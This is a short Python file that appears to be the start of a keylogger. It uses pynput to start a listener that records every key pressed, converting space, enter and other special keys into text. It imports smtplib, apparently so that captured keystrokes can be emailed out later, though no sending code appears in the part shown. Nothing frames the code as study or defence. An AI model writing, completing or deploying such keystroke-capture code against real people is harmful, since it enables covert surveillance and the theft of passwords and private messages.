from pynput import keyboard
import threading
import smtplib
import os
from datetime import datetime
class Listener_keys(object):
    def __init__(self):
        self.key = None

    def on_press(self,k):
        try: 
            self.key = k.char
        except: 
            if k.name == "space":
                self.key = ' '
            elif k.name == "enter":
                self.key = '\n'
            else:
                self.key = "<"+str(k.name)+">"
    
    def iniciar_listener(self):
        keyboard.Listener(on_press=self.on_press).start()